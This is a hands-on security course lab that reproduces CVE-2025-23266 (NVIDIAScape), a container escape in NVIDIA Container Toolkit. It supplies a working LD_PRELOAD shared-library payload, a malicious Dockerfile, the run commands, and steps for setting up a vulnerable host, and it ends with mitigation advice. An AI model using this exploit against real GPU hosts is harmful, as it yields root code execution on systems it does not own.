# %%
"""
# Day 7 — Section 3: NVIDIA Container Toolkit Vulnerability

This controlled lab examines CVE-2025-23266 (NVIDIAScape) as a trust-boundary
failure between an untrusted GPU container and a privileged host runtime hook.
Run it only on the provided disposable course environment.

<!-- toc -->

## Content & Learning Objectives

### NVIDIA container-runtime escape

> **Learning Objectives**
> - Trace data and authority across the OCI hook boundary
> - Explain why inherited `LD_PRELOAD` reaches a privileged host process
> - Reproduce the issue in the controlled lab and verify the host-side effect
> - Identify the patch boundary and defense-in-depth controls
"""

# %%
"""
## NVIDIA Container Toolkit Escape

This is a hacking exercise. You will replicate [NVIDIAScape](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape), which is CVE-2025-23266 in NVIDIA Container Toolkit ≤ 1.17.7, and escape from a GPU container to execute arbitrary code on the host as root.

### What you are exploiting

When a container starts with `--runtime=nvidia --gpus=all`, the NVIDIA Container Toolkit registers an OCI **`createContainer` hook** that runs `nvidia-ctk hook enable-cuda-compat` as a **privileged host process**.

The bug: that hook **inherits environment variables from the container image**, including `LD_PRELOAD`. An attacker can preload a malicious `.so` into the hook process and run arbitrary code on the host.

```
docker run --runtime=nvidia --gpus=all <malicious-image>
  → NVIDIA runtime registers createContainer hook
  → hook inherits LD_PRELOAD from container ENV
  → hook cwd is container root filesystem
  → /proc/self/cwd/poc.so resolves to attacker's library in the image
  → poc.so constructor runs on the HOST with hook privileges
  → write /tmp/output-{yourname} (or any host path)
```

**Key resources:**
- [Wiz: NVIDIAScape / CVE-2025-23266](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape)
- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-23266)

### Prerequisites

| Requirement | Notes |
|---|---|
| Linux host with NVIDIA GPU + driver | `nvidia-smi` should work |
| Docker with NVIDIA runtime | `docker run --runtime=nvidia --gpus=all ...` |
| **Vulnerable** nvidia-container-toolkit | **≤ 1.17.7**, with `cuda-compat-mode=hook` |
| `runc` version with hook env inheritance | Tested with `runc 1.1.0-0ubuntu1`; newer `runc 1.3.4-0ubuntu1~22.04.1` does not reproduce this lab |
| Regular user (non-root) | Exploit must work without sudo |
| `gcc`, `make`, `docker` | For building `poc.so` and the image |

On the **course lab machine**, a vulnerable stack is pre-installed; do **not** install or upgrade NVIDIA packages.

### Setup

```bash
cd 7.3-nvidia-container-toolkit/module1
cp -r test day7-nvidia-{yourname}    # e.g. day7-nvidia-guava
cd day7-nvidia-{yourname}
```

You should have:

```
day7-nvidia-{yourname}/
├── poc.c        # your payload (edit this)
├── Dockerfile   # malicious image (edit this)
└── Makefile     # builds poc.so and Docker image
```

Ignore `module1/solution` unless you are stuck.

### Step 1: Write `poc.c`

Use a **constructor** in a shared library: it runs automatically when the library is loaded via `LD_PRELOAD`.

```c
#include <fcntl.h>
#include <pwd.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

void __attribute__((constructor)) init(void) {
    struct passwd *pw = getpwuid(getuid());
    const char *username = pw ? pw->pw_name : "unknown";

    char message[512] = "look it's me, user ";
    strcat(message, username);
    strcat(message, "\n");

    // Use a UNIQUE filename for your pair/team
    int fd = open("/tmp/output-{yourname}", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd != -1) {
        write(fd, message, strlen(message));
        close(fd);
    }
}
```

Replace `{yourname}` with something unique (e.g. `output-guava`, `output-pranav`).

### Step 2: Write `Dockerfile`

```dockerfile
FROM ubuntu:22.04

ENV LD_PRELOAD=/proc/self/cwd/poc.so
ADD poc.so /
```

- `ENV LD_PRELOAD=...`: poison the hook's environment
- `/proc/self/cwd/poc.so`: resolves relative to the hook's working directory (container root)
- `ADD poc.so /`: place the payload at `/poc.so` in the image

### Step 3: Build

```bash
make clean
make
```

This runs:

1. `gcc -fPIC -shared -O2 -Wall poc.c -o poc.so`
2. `docker build -t nvidia-ctk-image .`

Verify `poc.so` exists and the image built:

```bash
ls -l poc.so
docker images nvidia-ctk-image
```

### Step 4: Sanity check (optional, no Docker)

Simulate loading your library into `nvidia-ctk` directly:

```bash
rm -f /tmp/output-{yourname}
LD_PRELOAD=./poc.so nvidia-ctk --version
cat /tmp/output-{yourname}
```

Expected:

```
look it's me, user <your-username>
```

This confirms the payload works. It does **not** prove the full container escape, only that `LD_PRELOAD` + your `.so` executes host-side code when `nvidia-ctk` starts.

### Step 5: Run the exploit

```bash
rm -f /tmp/output-{yourname}

docker run --rm --runtime=nvidia --gpus=all nvidia-ctk-image echo hello

ls -l /tmp/output-{yourname}
cat /tmp/output-{yourname}
```

**Success:** `/tmp/output-{yourname}` exists **on the host** after the container exits, even though you ran Docker as a regular user. The container only printed `hello`; the escape happened in the privileged hook before the container process started.

Clean up:

```bash
sudo rm /tmp/output-{yourname}
```

### Host setup (for self-testing)

If you are not on the lab VM, install a vulnerable toolkit, use a runtime stack
that preserves hook environment inheritance, and enable hook mode. See
`module1/setup.txt` for commands.

Known-good tested versions:

| Component | Version |
|---|---|
| OS | Ubuntu 22.04, Linux 5.15 |
| GPU / driver | NVIDIA A10, driver 580.173.02 |
| Docker | 29.1.3-0ubuntu3~22.04.2 |
| containerd | 2.2.1-0ubuntu1~22.04.2 |
| runc | 1.1.0-0ubuntu1 |
| nvidia-container-toolkit | 1.17.7-1 |
| libnvidia-container | 1.17.7-1 |
| NVIDIA runtime mode | `legacy` |
| CUDA compat mode | `hook` |

Summary:

1. Install nvidia-container-toolkit **1.17.7** (do not use 1.17.8+ for the lab)
2. Install and pin `runc 1.1.0-0ubuntu1`
3. `sudo nvidia-ctk runtime configure --runtime=docker`
4. `sudo nvidia-ctk config --in-place --set nvidia-container-runtime.mode=legacy --set nvidia-container-runtime.modes.legacy.cuda-compat-mode=hook`
5. `sudo systemctl restart docker`

Default on patched installs is `cuda-compat-mode = "ldconfig"`, which does not use the vulnerable code path.

### Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| Container runs but no `/tmp/output-*` on host | Patched toolkit (≥ 1.17.8) | Use lab VM or downgrade to 1.17.7 |
| Same as above | `cuda-compat-mode = "ldconfig"` | Set to `hook` and restart Docker |
| Same as above | Newer `runc` does not propagate the container env to the hook | Use the lab VM or pin `runc 1.1.0-0ubuntu1` |
| `docker: could not select device driver` | NVIDIA runtime not configured | `sudo nvidia-ctk runtime configure --runtime=docker` |
| `LD_PRELOAD` test works, Docker does not | Hook not inheriting env (patched) | Vulnerable version + hook mode required |

### Security takeaway

- Containers are not a strong isolation boundary for GPU workloads.
- A misconfigured **trusted host component** (OCI hook) + classic `LD_PRELOAD` = full host compromise.
- Mitigation: upgrade to toolkit ≥ 1.17.8, or disable the cuda-compat hook via `disable-cuda-compat-lib-hook = true`.

---

## Summary

- GPU-enablement hooks extend the container trust boundary into privileged host code.
- Host utilities must not inherit attacker-controlled container environment state.
- Patch the toolkit and constrain which workloads receive direct GPU-runtime access.

### Further Reading

- [Wiz analysis of NVIDIAScape](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape)
- [NVIDIA security advisories](https://www.nvidia.com/en-us/security/)
"""
